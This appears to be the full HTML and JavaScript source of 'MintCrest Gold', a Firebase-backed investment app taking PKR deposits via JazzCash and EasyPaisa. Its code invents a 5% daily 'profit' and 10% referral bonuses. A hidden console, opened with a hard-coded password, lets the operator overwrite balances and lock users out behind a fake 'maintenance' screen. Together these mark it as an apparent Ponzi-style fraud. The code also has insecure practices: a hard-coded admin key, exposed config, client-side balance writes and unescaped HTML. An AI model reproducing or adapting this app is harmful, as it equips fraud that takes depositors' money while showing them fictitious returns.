<html lang="en" id="main-html" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>MintCrest Gold | Monarch Ultimate</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --bg: #010409; --card: #0d1117; --text: #f0f6fc; --border: #30363d; --blue: #2f81f7; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; }
        .glass { background: var(--card); border: 1px solid var(--border); border-radius: 20px; }
        .page { display: none; animation: slideUp 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        input { background: #161b22; border: 1px solid var(--border); color: white; padding: 15px; border-radius: 12px; width: 100%; outline: none; margin-bottom: 12px; font-size: 14px; transition: 0.3s; }
        input:focus { border-color: var(--blue); }
        .btn-prime { background: linear-gradient(135deg, #2f81f7, #1e40af); color: white; font-weight: 800; border-radius: 14px; cursor: pointer; border: none; padding: 18px; width: 100%; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
        #toast { visibility: hidden; min-width: 250px; background: #2f81f7; color: #fff; text-align: center; border-radius: 10px; padding: 18px; position: fixed; z-index: 20000; left: 50%; transform: translateX(-50%); bottom: 100px; font-size: 12px; font-weight: 800; }
        #toast.show { visibility: visible; animation: fadeInOut 3s; }
        @keyframes fadeInOut { 0%, 100% { opacity: 0; bottom: 80px; } 15%, 85% { opacity: 1; bottom: 100px; } }
        .nav-btn { opacity: 0.4; transition: 0.3s; cursor: pointer; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-btn.active { opacity: 1; color: #2f81f7; transform: translateY(-5px); }
    </style>
</head>
<body onclick="handleGlobalTaps()">

    <div id="toast">NODE SECURED</div>

    <div id="lock-screen" class="fixed inset-0 z-[1000000] bg-[#010409] hidden flex flex-col items-center justify-center p-10 text-center">
        <div class="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-8"></div>
        <h1 class="text-2xl font-black text-blue-500 mb-3 uppercase tracking-widest">System Syncing</h1>
        <p class="text-[10px] font-bold opacity-40 uppercase tracking-widest leading-loose">Improving financial nodes for your profit sweetie! 😘</p>
    </div>

    <header class="p-5 flex justify-between items-center bg-[#010409]/95 backdrop-blur-lg border-b border-white/5 sticky top-0 z-[5000]">
        <div class="flex items-center gap-4">
            <div onclick="adminTrigger()" class="w-11 h-11 bg-blue-600 rounded-2xl flex items-center justify-center text-white font-black text-xl shadow-lg cursor-pointer">M</div>
            <div>
                <h1 class="text-[14px] font-black uppercase tracking-tighter">MINTCREST <span class="text-blue-500">GOLD</span></h1>
                <p id="node-status" class="text-[8px] font-bold opacity-50 uppercase text-blue-400">Verifying Node...</p>
            </div>
        </div>
        <div id="top-balance" class="bg-blue-600/10 px-5 py-2.5 rounded-2xl border border-blue-500/20 text-blue-500 text-[12px] font-black italic">PKR 0.00</div>
    </header>

    <main id="app-main" class="hidden p-6 space-y-8 pb-32">
        
        <div id="p-home" class="page active-page space-y-8">
            <div class="glass p-8 bg-gradient-to-br from-blue-900 via-[#0d1117] to-[#010409] border-blue-500/10 relative overflow-hidden">
                <div class="absolute -right-10 -top-10 w-32 h-32 bg-blue-500/10 rounded-full blur-3xl"></div>
                <p class="text-[10px] font-bold opacity-40 uppercase tracking-[2px]">Portfolio Value</p>
                <h2 class="text-5xl font-black tracking-tighter mt-2" id="v-balance">PKR 0</h2>
                <div class="mt-10 flex gap-4">
                    <button onclick="changePage('deposit')" class="flex-1 py-4 bg-blue-500 text-white rounded-2xl font-black text-[11px] uppercase shadow-lg shadow-blue-500/20 active:scale-95 transition">Add Asset</button>
                    <button onclick="changePage('withdraw')" class="flex-1 py-4 bg-white/5 border border-white/10 rounded-2xl font-black text-[11px] uppercase active:scale-95 transition">Payout</button>
                </div>
            </div>
            
            <div id="plans-list" class="space-y-4"></div>
        </div>

        <div id="p-team" class="page space-y-7">
            <div class="glass p-7 text-center border-l-4 border-blue-500">
                <p class="text-[10px] font-bold opacity-40 uppercase mb-3">Your Referral Asset Link</p>
                <div class="flex items-center gap-3 bg-white/5 p-4 rounded-2xl border border-white/5">
                    <p id="ref-url" class="text-[11px] font-bold text-blue-500 break-all flex-1 text-left">Generating...</p>
                    <button onclick="copyRef()" class="text-blue-500 text-xl"><i class="fa-solid fa-copy"></i></button>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-5">
                <div class="glass p-6 text-center"><h4 id="team-nodes" class="text-3xl font-black">0</h4><p class="text-[9px] opacity-40 uppercase font-bold mt-1">Total Nodes</p></div>
                <div class="glass p-6 text-center"><h4 id="team-earning" class="text-3xl font-black text-green-500">PKR 0</h4><p class="text-[9px] opacity-40 uppercase font-bold mt-1">Net Bonus</p></div>
            </div>
        </div>

        <div id="p-deposit" class="page space-y-7">
            <div id="bank-details" class="space-y-3"></div>
            <div class="glass p-7 space-y-5">
                <input type="number" id="d-amt" placeholder="Enter Amount">
                <input type="text" id="d-tid" placeholder="Transaction ID (TID)">
                <input type="file" id="d-img" class="text-[11px] border-2 border-dashed border-white/10 py-6 text-center">
                <button onclick="sendDeposit()" class="btn-prime">Verify Asset Transfer</button>
            </div>
        </div>

        <div id="p-withdraw" class="page space-y-7">
            <div class="glass p-7 space-y-5">
                <input type="number" id="w-amt" placeholder="Min Withdrawal: 500">
                <input type="text" id="w-acc" placeholder="Wallet Number">
                <input type="text" id="w-name" placeholder="Account Name">
                <button onclick="sendWithdraw()" class="w-full py-4 bg-red-600/10 text-red-500 border border-red-500/20 rounded-2xl font-black text-[11px] uppercase">Request Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#010409] z-[100000] hidden overflow-y-auto p-7 pb-40">
        <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-5">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Master Console</h2>
            <button onclick="closeAdmin()" class="bg-white/5 px-6 py-2 rounded-xl text-[10px] font-bold">EXIT</button>
        </div>

        <button onclick="toggleLock()" id="m-btn" class="w-full py-4 mb-8 rounded-2xl font-black text-[11px] uppercase">Maintenance Mode: --</button>
        
        <div id="admin-queue" class="space-y-5"></div>

        <div class="glass p-7 mt-10 border-l-4 border-purple-500">
            <h4 class="text-[11px] font-black uppercase text-purple-500 mb-5">Force Balance Override</h4>
            <input id="adm-target" placeholder="User Name">
            <input id="adm-bal" type="number" placeholder="New Balance">
            <button onclick="forceEdit()" class="w-full py-4 bg-purple-600 rounded-2xl font-black text-[11px] uppercase">Overwrite Database</button>
        </div>
    </div>

    <nav id="nav-bar" class="hidden fixed bottom-0 w-full glass bg-[#0d1117]/98 border-t border-white/5 p-7 flex justify-around items-center z-[5000] rounded-t-[40px] shadow-2xl">
        <div onclick="changePage('home')" class="nav-btn active" id="nav-home"><i class="fa-solid fa-bolt text-2xl"></i><span class="text-[8px] font-bold uppercase">Node</span></div>
        <div onclick="changePage('team')" class="nav-btn" id="nav-team"><i class="fa-solid fa-users text-2xl"></i><span class="text-[8px] font-bold uppercase">Team</span></div>
        <div onclick="changePage('deposit')" class="nav-btn" id="nav-deposit"><i class="fa-solid fa-circle-plus text-2xl"></i><span class="text-[8px] font-bold uppercase">Add</span></div>
        <div onclick="changePage('withdraw')" class="nav-btn" id="nav-withdraw"><i class="fa-solid fa-hand-holding-dollar text-2xl"></i><span class="text-[8px] font-bold uppercase">Get</span></div>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let user = null; let tA = 0; let tB = 0; let mStatus = false;

        // --- ADMIN GOD-MODE ENGINE ---
        function adminTrigger() { tA++; if(tA >= 5) { if(prompt("Security Key:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tA=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function handleGlobalTaps() {
            if(!document.getElementById('lock-screen').classList.contains('hidden')) {
                tB++; if(tB >= 5) { if(prompt("Master Override:")==="mint786") { document.getElementById('lock-screen').classList.add('hidden'); document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tB=0; }
            }
        }

        async function syncAdmin() {
            db.collection("requests").where("status","==","pending").onSnapshot(s => {
                const q = document.getElementById('admin-queue'); q.innerHTML = '';
                s.forEach(doc => {
                    const r = doc.data();
                    q.innerHTML += `<div class="glass p-6 border-l-4 border-blue-500 text-[11px] font-bold uppercase">
                        <p class="mb-2">${r.type} | ${r.user}</p>
                        <p class="mb-4 text-blue-500 font-black">PKR ${r.amount.toLocaleString()}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full rounded-2xl mb-4">` : ''}
                        <button onclick="approveReq('${doc.id}','${r.user}',${r.amount},'${r.type}')" class="w-full py-4 bg-green-600 rounded-xl">APPROVE TRANSACTION</button>
                    </div>`;
                });
            });
            db.collection("settings").doc("system").onSnapshot(d => {
                mStatus = d.data()?.maintenance;
                document.getElementById('m-btn').innerText = "Maintenance Mode: " + (mStatus?"ON":"OFF");
                document.getElementById('m-btn').className = mStatus ? "w-full py-4 mb-8 bg-red-600/10 text-red-500 border border-red-500/20 rounded-2xl font-black text-[11px] uppercase" : "w-full py-4 mb-8 bg-green-600/10 text-green-500 border border-green-500/20 rounded-2xl font-black text-[11px] uppercase";
            });
        }

        async function approveReq(id, u, a, type) {
            if(type === 'Deposit') {
                await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(a), active: true });
                const snap = await db.collection("users").doc(u).get();
                if(snap.data().refBy && snap.data().refBy !== 'Direct') {
                    await db.collection("users").doc(snap.data().refBy).update({ balance: firebase.firestore.FieldValue.increment(a * 0.10) });
                }
            } else {
                await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(-a) });
            }
            await db.collection("requests").doc(id).update({ status: 'approved' });
            showToast("VERIFIED");
        }

        async function forceEdit() {
            const u = document.getElementById('adm-target').value;
            const b = Number(document.getElementById('adm-bal').value);
            await db.collection("users").doc(u).update({ balance: b });
            showToast("OVERWRITTEN");
        }

        async function toggleLock() { await db.collection("settings").doc("system").set({ maintenance: !mStatus }); }

        // --- AUTOMATED DAILY PROFIT ENGINE ---
        async function runAutoProfit(id, data) {
            const now = Date.now();
            const last = data.lastYield || 0;
            const day = 24 * 60 * 60 * 1000;
            if (data.active && (now - last) >= day) {
                const gain = Math.floor(data.balance * 0.05);
                if (gain > 0) {
                    await db.collection("users").doc(id).update({ balance: firebase.firestore.FieldValue.increment(gain), lastYield: now });
                    showToast(`+PKR ${gain} DAILY PROFIT ADDED! 😘`);
                }
            }
        }

        // --- USER CORE ---
        function syncUser(id) {
            db.collection("users").doc(id).onSnapshot(async d => {
                user = d.data(); if(!user) return;
                await runAutoProfit(id, user);
                const b = (user.balance || 0).toLocaleString();
                document.getElementById('v-balance').innerText = "PKR " + b;
                document.getElementById('top-balance').innerText = "PKR " + b;
                document.getElementById('ref-url').innerText = window.location.origin + "/?ref=" + id;
                db.collection("users").where("refBy","==",id).onSnapshot(s => {
                    document.getElementById('team-nodes').innerText = s.size;
                    let e = 0; s.forEach(doc => e += (doc.data().balance * 0.1));
                    document.getElementById('team-earning').innerText = "PKR " + Math.floor(e).toLocaleString();
                });
            });
            db.collection("settings").doc("system").onSnapshot(d => {
                if(d.data()?.maintenance && id !== 'admin') document.getElementById('lock-screen').classList.remove('hidden');
                else document.getElementById('lock-screen').classList.add('hidden');
            });
            db.collection("plans").orderBy("price","asc").onSnapshot(s => {
                const l = document.getElementById('plans-list'); l.innerHTML = '';
                s.forEach(doc => {
                    const p = doc.data();
                    l.innerHTML += `<div class="glass p-7 border-l-4 border-blue-500 flex justify-between items-center transition active:scale-95">
                        <div><p class="text-[9px] opacity-30 uppercase font-black">${p.name}</p><h4 class="text-2xl font-black">PKR ${p.price.toLocaleString()}</h4><p class="text-[10px] text-green-500 font-bold mt-1">ROI: PKR ${p.dailyProfit}/Day</p></div>
                        <button onclick="changePage('deposit')" class="bg-blue-600 px-7 py-4 rounded-2xl font-black text-[10px] shadow-lg">UPGRADE</button>
                    </div>`;
                });
            });
            db.collection("settings").doc("gateways").onSnapshot(d => {
                const g = d.data();
                document.getElementById('bank-details').innerHTML = `
                    <div class="p-5 glass flex justify-between text-[12px] font-black border-l-4 border-yellow-500"><span>JazzCash Node</span><span>${g.jazz}</span></div>
                    <div class="p-5 glass flex justify-between text-[12px] font-black border-l-4 border-green-500"><span>EasyPaisa Node</span><span>${g.easy}</span></div>`;
            });
        }

        async function sendDeposit() {
            const a = Number(document.getElementById('d-amt').value); const t = document.getElementById('d-tid').value; const f = document.getElementById('d-img').files[0];
            if(!a || !t || !f) return alert("All details required sweetie!");
            const r = new FileReader(); r.readAsDataURL(f);
            r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: a, tid: t, proof: r.result, type: 'Deposit', status: 'pending', time: Date.now() });
                showToast("NODE VERIFICATION PENDING"); changePage('home');
            };
        }

        async function sendWithdraw() {
            const a = Number(document.getElementById('w-amt').value); const acc = document.getElementById('w-acc').value; const n = document.getElementById('w-name').value;
            if(a < 500 || !acc || !n) return alert("Minimum 500 and full data required.");
            if(a > user.balance) return alert("Insufficient Balance.");
            await db.collection("requests").add({ user: user.name, amount: a, account: acc, title: n, type: 'Withdraw', status: 'pending', time: Date.now() });
            showToast("PAYOUT REQUESTED"); changePage('home');
        }

        function showToast(m) { const t = document.getElementById("toast"); t.innerText = m; t.className = "show"; setTimeout(()=>t.className="", 3000); }
        function changePage(p) { 
            document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page');
            document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active')); document.getElementById('nav-'+p).classList.add('active');
        }
        function copyRef() { navigator.clipboard.writeText(document.getElementById('ref-url').innerText); showToast("LINK COPIED!"); }
        
        window.onload = () => { 
            const session = localStorage.getItem('mc_session');
            if(session) {
                document.getElementById('node-status').innerText = "NODE-ID: " + session.toUpperCase();
                document.getElementById('app-main').classList.remove('hidden');
                document.getElementById('nav-bar').classList.remove('hidden');
                syncUser(session);
            }
        }
    </script>
</body>
</html>
